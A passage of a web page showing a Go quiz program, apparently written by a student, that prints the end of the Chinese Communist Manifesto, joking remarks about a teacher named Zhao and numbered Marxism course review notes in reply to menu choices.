人对人的剥削一消灭，民族对民族的剥削就会随之消灭。\n　　 民族内部的阶级对立一消失，民族之间的敌对关系就会随之消失。\n　　 从宗教的、哲学的和一切意识形态的观点对共产主义提出的种种责难，都不值得详细讨论了。\n　　 人们的观念、观点和概念，一句话，人们的意识，随着人们的生活条件、人们的社会关系、人们的社会存在的改变而改变，这难道需要经过深思才能了解吗？\n　　 思想的历史除了证明精神生产随着物质生产的改造而改造，还证明了什么呢？任何一个时代的统治思想始终都不过是统治阶级的思想。\n　　 当人们谈到使整个社会革命化的思想时，他们只是表明了一个事实：在旧社会内部已经形成了新社会的因素，旧思想的瓦解是同旧生活条件的瓦解步调一致的。\n　　 当古代世界走向灭亡的时候，古代的各种宗教就被基督教战胜了。当基督教思想在18世纪被启蒙思想击败的时候，封建社会正在同当时革命的资产阶级进行殊死的斗争。信仰自由和宗教自由的思想，不过表明竞争在信仰领域里占统治地位罢了。\n　　 “但是”，有人会说，“宗教的、道德的、哲学的、政治的、法的观念等等在历史发展的进程中固然是不断改变的，而宗教、道德、哲学、政治和法在这种变化中却始终保存着。\n　　 此外，还存在着一切社会状态所共有的永恒真理，如自由、正义等等。但是共产主义要废除永恒真理，它要废除宗教、道德，而不是加以革新，所以共产主义是同至今的全部历史发展相矛盾的。”\n　　 这种责难归结为什么呢？至今的一切社会的历史都是在阶级对立中运动的，而这种对立在不同的时代具有不同的形式。\n　　 但是，不管阶级对立具有什么样的形式，社会上一部分人对另一部分人的剥削却是过去各个世纪所共有的事实。因此，毫不奇怪，各个世纪的社会意识，尽管形形色色、千差万别，总是在某些共同的形式中运动的，这些形式，这些意识形式，只有当阶级对立完全消失的时候才会完全消失。\n　　 共产主义革命就是同传统的所有制关系实行最彻底的决裂；毫不奇怪，它在自己的发展进程中要同传统的观念实行最彻底的决裂。\n　　 不过，我们还是把资产阶级对共产主义的种种责难撇开吧。\n　　 前面我们已经看到，工人革命的第一步就是使无产阶级上升为统治阶级，争得民主。\n　　 无产阶级将利用自己的政治统治，一步一步地夺取资产阶级的全部资本，把一切生产工具集中在国家即组织成为统治阶级的无产阶级手里，并且尽可能快地增加生产力的总量。\n　　 要做到这一点，当然首先必须对所有权和资产阶级生产关系实行强制性的干涉，也就是采取这样一些措施，这些措施在经济上似乎是不够充分的和没有力量的，但是在运动进程中它们会越出本身，而且作为变革全部生产方式的手段是必不可少的。\n　　 这些措施在不同的国家里当然会是不同的。\n　　 但是，最先进的国家几乎都可以采取下面的措施：\n 1、剥夺地产，把地租用于国家支出。\n 2、征收高额累进税。\n 3、废除继承权。\n 4、没收一切流亡分子和叛乱分子的财产。\n 5、通过拥有国家资本和独享垄断权的国家银行，把信贷集中在国家手里。\n 6、把全部运输业集中在国家的手里。\n 7、按照总的计划增加国家工厂和生产工具，开垦荒地和改良土壤。\n 8、实行普遍劳动义务制，成立产业军，特别是在农业方面。\n 9、把农业和工业结合起来，促使城乡对立逐步消灭。\n 10、对所有儿童实行公共的和免费的教育。取消现在这种形式的儿童的工厂劳动。把教育同物质生产结合起来，等等。\n　　 当阶级差别在发展进程中已经消失而全部生产集中在联合起来的个人的手里的时候，公共权力就失去政治性质。原来意义上的政治权力，是一个阶级用以压迫另一个阶级的有组织的暴力。如果说无产阶级在反对资产阶级的斗争中一定要联合为阶级，如果说它通过革命使自己成为统治阶级，并以统治阶级的资格用暴力消灭旧的生产关系，那么它在消灭这种生产关系的同时，也就消灭了阶级对立的存在条件，消灭阶级本身的存在条件，从而消灭了它自己这个阶级的统治。\n　　 代替那存在着阶级和阶级对立的资产阶级旧社会的，将是这样一个联合体，在那里，每个人的自由发展是一切人的自由发展的条件。\n\n三、社会主义的和共产主义的文献\n\n1、反动的社会主义\n\n（甲）封建的社会主义\n　　 法国和英国的贵族，按照他们的历史地位所负的使命，就是写一些抨击现代资产阶级社会的作品。在法国的1830年七月革命和英国的改革运动 中，他们再一次被可恨的暴发户打败了。从此就再谈不上严重的政治斗争了。他们还能进行的只是文字斗争。但是，即使在文字方面也不可能重弹复辟时期的老调了。为了激起同情，贵族们不得不装模作样，似乎他们已经不关心自身的利益，只是为了被剥削的工人阶级的利益才去写对资产阶级的控诉书。他们用来泄愤的手段是：唱唱诅咒他们的新统治者的歌，并向他叽叽咕咕地说一些或多或少凶险的预言。\n　　 这样就产生了封建的社会主义，半是挽歌，半是谤文，半是过去的回音，半是未来的恫吓；它有时也能用辛辣、俏皮而尖刻的评论剌中资产阶级的心，但是它由于完全不能理解现代历史的进程而总是令人感到可笑。\n　　 为了拉拢人民，贵族们把无产阶级的乞食袋当作旗帜来挥舞。但是，每当人民跟着他们走的时候，都发现他们的臀部带有旧的封建纹章，于是就哈哈大笑，一哄而散。\n　　 一部分法国正统派和“青年英国”，都演过这出戏。\n　　 封建主说，他们的剥削方式和资产阶级的剥削不同，那他们只是忘记了，他们是在完全不同的、目前已经过时的情况和条件下进行剥削的。他们说，在他们的统治下并没有出现过现代的无产阶级，那他们只是忘记了，现代的资产阶级正是他们的社会制度的必然产物。\n　　 不过，他们毫不掩饰自己的批评的反动性质，他们控告资产阶级的主要罪状正是在于：在资产阶级的统治下有一个将把整个旧社会制度炸毁的阶级发展起来。\n　　 他们责备资产阶级，与其说是因为它产生了无产阶级，不如说是因为它产生了革命的无产阶级。\n　　 因此，在政治实践中，他们参与对工人阶级采取的一切暴力措施，在日常生活中，他们违背自己的那一套冠冕堂皇的言词，屈尊拾取金苹果，不顾信义、仁爱和名誉去做羊毛、甜菜和烧酒的买卖。\n　　 正如僧侣总是同封建主携手同行一样，僧侣的社会主义也总是同封建的社会主义携手同行的。\n　　 要给基督教禁欲主义涂上一层社会主义的色彩，是再容易不过了。基督教不是也激烈反对私有财产，反对婚姻，反对国家吗？它不是提倡用行善和求乞、独身和禁欲、修道和礼拜来代替这一切吗？基督教的社会主义，只不过是僧侣用来使贵族的怨愤神圣的圣水罢了。\n\n（乙）小资产阶级的社会主义\n\n　　 封建贵族并不是被资产阶级所推翻的、其生活条件在现代资产阶级社会里日益恶化和消失的唯一阶级。中世纪的城关市民和小农等级是现代资产阶级的前身。在工商业不很发达的国家里，这个阶级还在新兴的资产阶级身旁勉强生存着。\n　　 在现代文明已经发展的国家里，形成了一个新的小资产阶级，它摇摆于无产阶级和资产阶级之间，并且作为资产阶级社会的补充部分不断地重新组成。但是，这一阶级的成员经常被竞争抛到无产阶级队伍里去，而且，随着大工业的发展，他们甚至觉察到，他们很快就会完全失去他们作为现代社会中一个独立部分的地位，在商业、工业和农业中很快就会被监工和雇员所代替。\n　　 在农民阶级远远超过人口半数的国家，例如在法国，那些站在无产阶级方面反对资产阶级的著作家，自然是用小资产阶级和小农的尺度去批判资产阶级制度的，是从小资产阶级的立场出发替工人说话的。这样就形成了小资产阶级的社会主义。西斯蒙第不仅对法国而且对英国来说都是这类著作家的首领。\n　　 这种社会主义非常透彻地分析了现代生产关系中的矛盾。它揭穿了经济学家的虚伪的粉饰。它确凿地证明了机器和分工的破坏作用、资本和地产的积聚、生产过剩、危机、小资产者和小农的必然没落、无产阶级的贫困、生产的无政府状态、财富分配的极不平均、各民族之间的毁灭性的工业战争，以及旧风尚、旧家庭关系和旧民族性的解体。\n　　 但是，这种社会主义按其实际内容来说，或者是企图恢复旧的生产资料和交换手段，从而恢复旧的所有制关系和旧的社会，或者是企图重新把现代的生产资料和交换手段硬塞到已被它们突破而且必然被突破的旧的所有制关系的框子里去。它在这两种场合都是反动的，同时又是空想的。\n　　 工业中的行会制度，农业中的宗法经济，——这就是它的结论。\n　　 这一思潮在它以后的发展中变成了一种怯懦的悲叹。\n\n（丙）德国的或“真正的”社会主义\n\n　　 法国的社会主义和共产主义的文献是在居于统治地位的资产阶级的压迫下产生的，并且是同这种统治作斗争的文字表现，这种文献被搬到德国的时候，那里的资产阶级才刚刚开始进行反对封建专制制度的斗争。\n　　 德国的哲学家、半哲学家和美文学家，贪婪地抓住了这种文献，不过他们忘记了：在这种著作从法国搬到德国的时候，法国的生活条件却没有同时搬过去。在德国的条件下，法国的文献完全失去了直接实践的意义，而只具有纯粹文献的形式。它必然表现为关于真正的社会、关于实现人的本质的无谓思辨。这样，第一次法国革命的要求，在18世纪的德国哲学家看来，不过是一般“实践理性”的要求，而革命的法国资产阶级的意志的表现，在他们心目中就是纯粹的意志、本来的意志、真正人的意志的规律。\n　　 德国著作家的唯一工作，就是把新的法国的思想同他们的旧的哲学信仰调和起来，或者毋宁说，就是从他们的哲学观点出发去掌握法国的思想。\n　　 这种掌握，就像掌握外国语一样，是通过翻译的。\n　　 大家知道，僧侣们曾经在古代异教经典的手抄本上面写上荒诞的天主教圣徒传。德国著作家对世俗的法国文献采取相反的作法。他们在法国的原著下面写上自己的哲学胡说。例如，他们在法国人对货币关系的批判下面写上“人的本质的外化”，在法国人对资产阶级国家的批判下面写上所谓“抽象普遍物的统治的扬弃”，等等。\n　　 这种在法国人的论述下面塞进自己哲学词句的做法，他们称之为“行动的哲学”、”真正的社会主义”、“德国的社会主义科学”、“社会主义的哲学论证”，等等。\n　　 法国的社会主义和共产主义的文献就这样被完全阉割了。既然这种文献在德国人手里已不再表现一个阶级反对另一个阶级的斗争，于是德国人就认为：他们克服了“法国人的片面性”，他们不代表真实的要求，而代表真理的要求，不代表无产者的利益，而代表人的本质的利益，即一般人的利益，这种人不属于任何阶级，根本不存在于现实界，而只存在于云雾弥漫的哲学幻想的太空。\n　　 这种曾经郑重其事地看待自己那一套拙劣的小学生作业并且大言不惭地加以吹嘘的德国社会主义，现在渐渐失去了它的自炫博学的天真。\n　　 德国的特别是普鲁士的资产阶级反对封建主和专制王朝的斗争，一句话，自由主义运动，越来越严重了。\n　　 于是，“真正的”社会主义就得到了一个好机会，把社会主义的要求同政治运动对立起来，用诅咒异端邪说的传统办法诅咒自由主义，诅咒代议制国家，诅咒资产阶级的竞争、资产阶级的新闻出版自由、资产阶级的法、资产阶级的自由和平等，并且向人民群众大肆宣扬，说什么在这个资产阶级运动中，人民群众非但一无所得，反而会失去一切。德国的社会主义恰好忘记了，法国的批判（德国的社会主义是这种批判的可怜的回声）是以现代的资产阶级社会以及相应的物质生活条件和相当的政治制度为前提的，而这一切前提当时在德国正是尚待争取的。\n　　 这种社会主义成了德意志各邦专制政府及其随从——僧侣、教员、容克和官僚求之不得的、吓唬来势汹汹的资产阶级的稻草人。\n　　 这种社会主义是这些政府用来镇压德国工人起义的毒辣的皮鞭和枪弹的甜蜜的补充。\n　　 既然“真正的”社会主义就这样成了这些政府对付德国资产阶级的武器，那么它也就直接代表了一种反动的利益，即德国小市民的利益。在德国，16世纪遗留下来的、从那时起经常以不同形式重新出现的小资产阶级，是现存制度的真实的社会基础。\n　　 保存这个小资产阶级，就是保存德国的现存制度。这个阶级胆战心惊地从资产阶级的工业统治和政治统治那里等候着无可幸免的灭亡，这一方面是由于资本的积聚，另一方面是由于革命无产阶级的兴起。在它看来，“真正的”社会主义能起一箭双雕的作用。“真正的”社会主义像瘟疫一样流行起来了。\n　　 德国的社会主义者给自己的那几条干瘪的“永恒真理”披上一件用思辨的蛛丝织成的、绣满华丽辞藻的花朵和浸透甜情蜜意的甘露的外衣，这件光彩夺目的外衣只是使他们的货物在这些顾客中间增加销路罢了。\n　　 同时，德国的社会主义也越来越认识到自己的使命就是充当这种小市民的夸夸其谈的代言人。\n　　 它宣布德意志民族是模范的民族，德国小市民是模范的人。它给这些小市民的每一种丑行都加上奥秘的、高尚的、社会主义的意义，使之变成完全相反的东西。它发展到最后，就直接反对共产主义的“野蛮破坏的”倾向，并且宣布自己是不偏不倚地超乎任何阶级斗争之上的。现今在德国流行的一切所谓社会主义和共产主义的著作，除了极少数的例外，都属于这一类卑鄙龌龊的、令人委靡的文献。\n\n2、保守的或资产阶级的社会主义\n　　 资产阶级中的一部分人想要消除社会的弊病，以便保障资产阶级社会的生存。\n　　 这一部分人包括：经济学家、博爱主义者、人道主义者、劳动阶级状况改善派、慈善事业组织者、动物保护协会会员、戒酒协会发起人以及形形色色的小改良家。这种资产阶级的社会主义甚至被制成一些完整的体系。\n　　 我们可以举蒲鲁东的《贫困的哲学》作为例子。\n　　 社会主义的资产者愿意要现代社会的生存条件，但是不要由这些条件必然产生的斗争和危险。他们愿意要现存的社会，但是不要那些使这个社会革命化和瓦解的因素。他们愿意要资产阶级，但是不要无产阶级。在资产阶级看来，它所统治的世界自然是最美好的世界。资产阶级的社会主义把这种安慰人心的观念制成半套或整套的体系。它要求无产阶级实现它的体系，走进新的耶路撒冷，其实它不过是要求无产阶级停留在现今的社会里，但是要抛弃他们关于这个社会的可恶的观念。\n　　 这种社会主义的另一种不够系统、但是比较实际的形式，力图使工人阶级厌弃一切革命运动，硬说能给工人阶级带来好处的并不是这样或那样的政治改革，而仅仅是物质生活条件即经济关系的改变。但是，这种社会主义所理解的物质生活条件的改变，绝对不是只有通过革命的途径才能实现的资产阶级生产关系的废除，而是一些在这种生产关系的基础上实行的行政上的改良，因而丝毫不会改变资本和雇佣劳动的关系，至多只能减少资产阶级的统治费用和简化它的财政管理。\n　　 资产阶级的社会主义只有在它变成纯粹的演说辞令的时候，才获得自己的适当的表现。\n　　 自由贸易！为了工人阶级的利益；保护关税！为了工人阶级的利益；单身牢房！为了工人阶级的利益。——这才是资产阶级的社会主义唯一认真说出的最后的话。\n　　 资产阶级的社会主义就是这样一个论断：资产者之为资产者，是为了工人阶级的利益。\n\n3、批判的空想的社会主义和共产主义\n\n    在这里，我们不谈在现代一切大革命中表达过无产阶级要求的文献（巴贝夫等人的著作）。\n　　 无产阶级在普遍激动的时代、在推翻封建社会的时期直接实现自己阶级利益的最初尝试，都不可避免地遭到了失败，这是由于当时无产阶级本身还不够发展，由于无产阶级解放的物质条件还没具备，这些条件只是资产阶级时代的产物。随着这些早期的无产阶级运动而出现的革命文献，就其内容来说必然是反动的。这种文献倡导普遍的禁欲主义和粗陋的平均主义。\n　　 本来意义的社会主义和共产主义的体系，圣西门、傅立叶、欧文等人的体系，是在无产阶级和资产阶级之间的斗争还不发展的最初时期出现的。关于这个时期，我们在前面已经叙述过了（见《资产阶级和无产阶级》）。\n　　 诚然，这些体系的发明家看到了阶级的对立，以及占统治地位的社会本身中的瓦解因素的作用。但是，他们看不到无产阶级方面的任何历史主动性，看不到它所特有的任何政治运动。\n　　 由于阶级对立的发展是同工业的发展步调一致的，所以这些发明家也不可能看到无产阶级解放的物质条件，于是他们就去探求某种社会科学、社会规律，以便创造这些条件。\n　　 社会的活动要由他们个人的发明活动来代替，解放的历史条件要由幻想的条件来代替，无产阶级的逐步组织成为阶级要由一种特意设计出来的社会组织来代替。在他们看来，今后的世界历史不过是宣传和实施他们的社会计划。\n　　 诚然，他们也意识到，他们的计划主要是代表工人阶级这一受苦最深的阶级的利益。在他们心目中，无产阶级只是一个受苦最深的阶级。\n　　 但是，由于阶级斗争不发展，由于他们本身的生活状况，他们就以为自己是高高超乎这种阶级对立之上的。他们要改善社会一切成员的生活状况，甚至生活最优裕的成员也包括在内。因此，他们总是不加区别地向整个社会呼吁，而且主要是向统治阶级呼吁。他们以为，人们只要理解他们的体系，就会承认这种体系是最美好的社会的最美好的计划。\n　　因此，他们拒绝一切政治行动，特别是一切革命行动；他们想通过和平的途径达到自己的目的，并且企图通过一些小型的、当然不会成功的试验，通过示范的力量来为新的社会福音开辟道路。\n　　 这种对未来社会的幻想的描绘，在无产阶级还很不发展、因而对本身的地位的认识还基于幻想的时候，是同无产阶级对社会普遍改造的最初的本能的渴望相适应的。\n　　 但是，这些社会主义和共产主义的著作也含有批判的成分。这些著作抨击现存社会的全部基础。因此，它们提供了启发工人觉悟的极为宝贵的材料。它们关于未来社会的积极的主张，例如消灭城乡对立，消灭家庭，消灭私人营利，消灭雇佣劳动，提倡社会和谐，把国家变成纯粹的生产管理机构，——所有这些主张都只是表明要消灭阶级对立，而这种阶级对立在当时刚刚开始发展，它们所知道的只是这种对立的早期的、不明显的、不确定的形式。因此，这些主张本身还带有纯粹空想的性质。\n　　 批判的空想的社会主义和共产主义的意义，是同历史的发展成反比的。阶级斗争越发展和越具有确定的形式，这种超乎阶级斗争的幻想，这种反对阶级斗争的幻想，就越失去任何实践意义和任何理论根据。所以，虽然这些体系的创始人在许多方面是革命的，但是他们的信徒总是组成一些反动的宗派。这些信徒无视无产阶级的历史进展，还是死守着老师们的旧观点。因此，他们一贯企图削弱阶级斗争，调和对立。他们还总是梦想用试验的办法来实现自己的社会空想，创办单个的法伦斯泰尔，建立国内移民区，创立小伊加利亚，即袖珍版的新耶路撒冷，——而为了建造这一切空中楼阁，他们就不得不呼吁资产阶级发善心和慷慨解囊。他们逐渐地堕落到上述反动的或保守的社会主义者的一伙中去了，所不同的只是他们更加系统地卖弄学问，狂热地迷信自己那一套社会科学的奇功异效。\n　　 因此，他们激烈地反对工人的一切政治运动，认为这种运动只是由于盲目地不相信新福音才发生的。\n　　 在英国，有欧文主义者反对宪章派，在法国，有傅立叶主义者反对改革派。\n\n四、共产党人对各种反对党派的态度\n\n看过第二章之后，就可以了解共产党人同已经形成的工人政党的关系，因而也就可以了解他们同英国宪章派和北美土地改革派的关系。\n　　 共产党人为工人阶级的最近的目的和利益而斗争，但是他们在当前的运动中同时代表运动的未来。在法国，共产党人同社会主义民主党联合起来反对保守的和激进的资产阶级，但是并不因此放弃对那些从革命的传统中承袭下来的空谈和幻想采取批判态度的权利。\n　　 在瑞士，共产党人支持激进派，但是并不忽略这个政党是由互相矛盾的分子组成的，其中一部分是法国式的民主社会主义者，一部分是激进的资产者。\n　　 在波兰人中间，共产党人支持那个把土地革命当作民族解放的条件的政党，即发动过1846年克拉科夫起义的政党。\n　　 在德国，只要资产阶级采取革命的行动，共产党就同它一起去反对专制君主制、封建土地所有制和小市民的反动性。\n　　 但是，共产党一分钟也不忽略教育工人尽可能明确地意识到资产阶级和无产阶级的敌对的对立，以便德国工人能够立刻利用资产阶级统治所必然带来的社会的和政治的条件作为反对资产阶级的武器，以便在推翻德国的反动阶级之后立即开始反对资产阶级本身的斗争。\n　　 共产党人把自己的主要注意力集中在德国，因为德国正处在资产阶级革命的前夜，因为同17世纪的英国和18世纪的法国相比，德国将在整个欧洲文明更进步的条件下，拥有发展得多的无产阶级去实现这个变革，因而德国的资产阶级革命只能是无产阶级革命的直接序幕。\n　　 总之，共产党人到处都支持一切反对现存的社会制度和政治制度的革命运动。\n　　 在所有这些运动中，他们都强调所有制问题是运动的基本问题，不管这个问题的发展程度怎样。\n　　 最后，共产党人到处都努力争取全世界民主政党之间的团结和协调。\n　　 共产党人不屑于隐瞒自己的观点和意图。他们公开宣布：他们的目的只有用暴力推翻全部现存的社会制度才能达到。让统治阶级在共产主义革命面前发抖吧。无产者在这个革命中失去的只是锁链。他们获得的将是整个世界。\n\n全世界无产者，联合起来！\n&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">4</span>&#123;<br>fmt.Println(<span class="hljs-string">&quot;是马克思主义理论体系的简称，是关于全世界无产阶级和全人类彻底解放的学说。它由马克思主义哲学、马克思主义政治经济学和科学社会主义三大部分组成，是马克思、恩格斯在批判地继承和吸收人类关于自然科学、思维科学、社会科学优秀成果的基础上于19世纪40年代创立的，并在实践中不断地丰富、发展和完善的无产阶级思想的科学体系。&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">5</span>&#123;<br>fmt.Println(<span class="hljs-string">&quot;我的好兄弟&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">6</span>&#123;<br>fmt.Println(<span class="hljs-string">&quot;多去看看马克思主义，或许你能发现一点东西&quot;</span>)<br>&#125;<br><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">zh</span><span class="hljs-params">()</span></span>  &#123;<br>fmt.Println(<span class="hljs-string">&quot;来，同学，你有什么问题，看赵老师能不能给你点启示。&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;你想知道什么：\n1.赵老师的生活经历\n2.赵老师的隐藏身份\n3.赵老师的独家复习资料&quot;</span>)<br><span class="hljs-keyword">var</span> num3 <span class="hljs-type">int8</span><br><span class="hljs-keyword">for</span> &#123;<br>_,err:=fmt.Scanf(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num3)<br><span class="hljs-keyword">if</span> err == io.EOF &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> num3==<span class="hljs-number">1</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;只记得赵老师三战博士，最后成功考取了！！！！！赵老师就是牛&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num3==<span class="hljs-number">2</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;有一个好爹的资本家&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;大家的奴隶主&quot;</span>)<br>&#125;<br>   <span class="hljs-keyword">if</span> num3==<span class="hljs-number">3</span> &#123;<br>   fmt.Println(<span class="hljs-string">&quot;导论&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;1 什么是马克思主义？马克思主义是由马克思和恩格斯创立并为后继者所不断发展的科学埋论体系，是关于自然、社会和人类思维发展一般规律的学说，是关于社会主义必然代替资本主义、最终实现共产主义的学说，是关于无产阶级解放全人类解放和每个人自由而全面发展的学说，是无产阶级政党和社会主义国家的指导思想，是指引人民创造美好生活的行动指南。\n2 马克思主义三个基本组成部分：马克思主义哲学、马克思主义政治经济学和科学社会主义。\n3 马克思主义的基本立场，是马克思主义观察、分析和解决问题的根本立足点和出发点。\n4 马克思主义产生于 19 世纪 40 年代，创始人是马克思和恩格斯。\n5 资本主义生产方式的发展是马克思主义产生的社会根源。\n6 无产阶级反抗资产阶级的斗争是马克思主义产生的阶级基础。\n7 法国、英国、德国工人运动的兴起，标志着现代无产阶级作为独立的政治力量登上了历史\n舞台。\n8 德国古典哲学、英国古典政治经济学、英法两国的空想社会主义为马克思主义的创立提供了直接的理论来源。\n9 细胞学说、能量守恒与转化定律、生物进化论，为马克思主义的产生提供了自然科学前提。\n10 马克思和恩格斯发表在 1844 年 2 月《德法年鉴》上的论文表明，他们完成了从唯心主义向唯物主义、从革命民主主义向共产主义的转变。\n11 《德意志意识形态》首次系统阐述了历史唯物主义的基本观点，实现了历史观上的伟大变革。\n12 1848 年 2 月，《共产党宣言》发表，标志着马克思主义的公开问世。｀\n13 《资本论》系统阐述了剩余价值学说，揭示了资本主义生产关系的秘密。\n14 唯物史观和剩余价值学说是马克思一生的两个伟大发现。\n15 恩格斯的《反杜林论》，全面阐述了马克思主义理论体系。\n16 列宁主义把马克思主义发展到一个新的历史阶段。\n17 马克思主义中国化，产生了毛泽东思想、邓小平理论、 “三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想。\n18 马克思主义具有鲜明的科学性、人民性、实践性、发展性。\n19 马克思主义科学的世界观和方法论基础，即辩证唯物主义和历史唯物主义，这是马克思主义科学性的重要体现。\n20 人民至上是马克思主义的政治立场。\n21 实践观点是马克思主义首要的和基本的观点。\n22 马克思主义的鲜明特征，如果用一句话来概括就是科学性与革命性的统一。\n23 马克思主义的当代价值：观察当代世界变化的认识工具、指引当代中国发展的行动指南、引领入类社会进步的科学真理。\n24 大学生在学习马克思主义理论的过程中，要有正确的态度和科学的\n方法：第一，努力学习和掌握马克思主义的基本立场、观点、方法。第二，努力学习和掌握马克思主义中国化的理论成果。第三，坚持理论联系实际的马克思主义学风。第四，自觉将马克思主义内化千心、外化千行。&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;第一章&quot;</span>)<br>   fmt.Println(<span class="hljs-string">&quot;1 哲学是系统化、理论化的世界观。\n2 从哲学上看，世界上的万事万物归结起来是两大类现象：物质现象和精神现象；人类的活动归纳起来是两大类：认识世界和改造世界。\n3 存在和思维的关系问题又称为物质和意识的关系问题，构成了全部哲学的基本问题。\n4 哲学基本问题主要包括两方面内容：一是存在和思维、物质和意识谁为本原的问题，即何者为第一性的问题；对这一问题的不同回答，形成了唯物主义和唯心主义两种根本对立的哲学派别。二是存在和思维、物质和意识是否具有同一性的问题，对这一问题的不同回答，产生了可知论和不可知论的理论分野。\n5 唯物主义分为古代朴素唯物主义、近代形而上学唯物主义和辩证唯物主义。\n6 20 世纪初，列宁对物质概念作了全面的科学的规定： “物质是标志客观实在的哲学范畴，这种客观实在是人通过感觉感知的，它不依赖于我们的感觉而存在，为我们的感觉所复写、摄影、反映。＂\n7 马克思主义的物质范畴的理论意义：第一，坚持了唯物主义一元论，同唯心主义一元论和二元论划清了界限。第二，坚持了能动的反映论和可知论，批判了不可知论。第三，体现了唯物论和辩证法的统一，克服了形而上学唯物主义的缺陷。第四，体现了唯物主义自然观与唯物主义历史观的统一，为彻底的唯物主义奠定了理论基础。\n8 物质的根本属性是运动。\n9 运动是标志一切事物和现象的变化及其过程的哲学范畴。物质和运动是不可分割的，运动是物质的运动，物质是运动着的物质，离开物质的运动和离开运动的物质都是不可想象的。\n10 相对静止是物质运动在一定条件下的稳定状态，具体包括两种状态：空间的相对位置暂时不变和事物的根本性质暂时不变。无条件的绝对运动和有条件的相对静止构成了对立统一的关系。\n11 时间和空间是运动着的物质的基本存在形式。\n12 时间是指物质运动的持续性、顺序性，特点是一维性。\n13 空间是指物质运动的广延性、伸张性，特点是三维性。\n14 物质运动与时间和空间的不可分割，证明了时间和空间的客观性。具体物质形态的时空是有限的，而整个物质世界的时空是无限的。\n15 意识观\n16 意识的能动作用主要表现在：第一，意识具有目的性和计划性。第二，意识具有创造性。第三，意识具有指导实践改造客观世界的作用。第四，意识具有调控人的行为和生理活动的作用。\n17 主观能动性和客观规律性的关系。\n一方面，尊重客观规律是正确发挥主观能动性的前提。规律是事物变化发展过程中本身所固有的内在的、本质的、必然的联系。另一方面，只有充分发挥主观能动性，才能正确认识和利用客观规律。\n18 人创造历史，不是随心所欲地创造。\n19 实践是客观规律性与主观能动性统一的基础。\n20 正确发挥人的主观能动性，有三个方面的前提和条件：第一，从实际出发是正确发挥人的主观能动性的前提。第二，实践是正确发挥人的主观能动性的根本途径。三，正确发挥人的主观能动性，还要依赖于一定的物质条件和物质手段。\n21 人工智能，实质上是对人脑组织结构与思维运行机制的模仿，是人类智能的物化。人工智能是人的意识能动性的一种特殊表现，是人的本质力量的对象化、现实化。\n22 人工智能不能取代或超越人类智能：第一，人工智能只是对人类的理性智能的模拟和扩展，不具备情感、信念、意志等人类意识形式。第二，社会性是人的意识所固有的本质属性，而人工智能不可能真正具备人类的社会属性。第三，第三，人类的自然语言是思维的物质外壳和意识的现实形式，而人工智能难以完全具备理解自然语言真实意义的能力。\n23 世界的统一性在于它的物质性，世界统一于物质。第一，自然界是物质的。第二，人类社会本质上也是物质的。第三，人的意识统一千物质。\n24 联系和发展的观点是唯物辩证法的总观点，集中体现了唯物辩证法的总特征。\n25 联系具有一系列特点：客观性、普遍性、多样性和有条件性。\n26 坚持联系的客观性，就是在联系的观点上坚持了唯物论。\n27 世界不是既成事物的集合体，而是过程的集合体。\n28 发展的实质是新事物的产生和旧事物的灭亡。\n29 新事物是不可战胜的。这是因为：第一，新事物适应已经变化了的环境和条件；第二，新事物既否定了旧事物中消极腐朽的东西，又保留了旧事物中合理的、适应新条件的因素，并添加了旧事物所不能容纳的新内容。第三，在社会历史领域内，新事物从从根本上符合人民群众的利益和要求。\n30 唯物辩证法揭示了事物变化发展的一般规律，即对立统一规律、量变质变规律和否定之否定规律，其中对立统一规律是根本规律。\n31 对立统一规律是唯物辩证法的实质和核心。\n32 对立统一规律揭示了事物普遍联系的根本内容和变化发展的内在动力，从根本上回答了事物为什么会发展的问题；对立统一规律是贯穿量变质变规律、否定之否定规律以及唯物辩证法基本范畴的中心线索，也是理解这些规律的＂钥匙”。\n33 对立统一规律提供了人们认识世界和改造世界的根本方法——矛盾分析方法。\n34 对立（斗争性）和统一（同一性）分别体现了矛盾的两种基本属性。\n35 矛盾的同一性是指矛盾着的对立面相互依存、相互贯通的性质和趋势。：一是矛盾着的对立面相互依存，互为存在的前提，并共处于一个统一体中；二是矛盾着的对立面相互贯通，在一定条件下可以相互转化。\n36 矛盾的斗争性是矛盾着的对立面相互排斥、相互分离的性质和趋势。\n37 矛盾分为对抗性矛盾和非对抗性矛盾两种基本形式。\n38 矛盾的同一性是有条件的、相对的，矛盾的斗争性是无条件的、绝对的。\n39 矛盾的同一性在事物发展中的作用表现在：第一，同一性是事物存在和发展的前提；第二，同一性使矛盾双方相互吸取有利于自身的因素，在相互作用中各自得到发展。第三，同一性规定着事物转化的可能和发展的趋势。\n40 矛盾的斗争性在事物发展中的作用表现在：第一，矛盾双方的斗争促进矛盾双方力量的变化，造成双方力量发展的不平衡。第二，矛盾双方的斗争是一种矛盾统一体向另一种矛盾统一体过渡的决定性力量。\n41 和谐是矛盾的一种特殊表现形式，体现着矛盾双方的相互依存、相互促进、共同发展。和谐并不意味着矛盾的绝对同一，和谐是相对的、有条件的，只有在矛盾双方处于平衡、协调、合作的情况下，事物才展现出和谐状态。\n42 主要矛盾是矛盾体系中处于支配地位、对事物发展起决定作用的矛盾。次要矛盾是矛盾体系中处于从属地位、对事物发展起次要作用的矛盾。\n43 事物的性质是由主要矛盾的主要方面所决定的。\n44 把主要矛盾和次要矛盾、矛盾的主要方面和次要方面的辩证关系运用到实际工作中，就是要坚持“两点论”和“重点论”的统一。\n45 矛盾的共性和个性、绝对和相对的道理，是关于事物矛盾问题的精髓。\n46 矛盾的普遍性和特殊性辩证关系的原理是马克思主义基本原理同各国具体实际相结合的哲学基础。\n47 事物包括质、量、度三方面的规定性。\n48 度这一哲学范畴启示我们，在认识和处理问题时要掌握适度原则。\n49 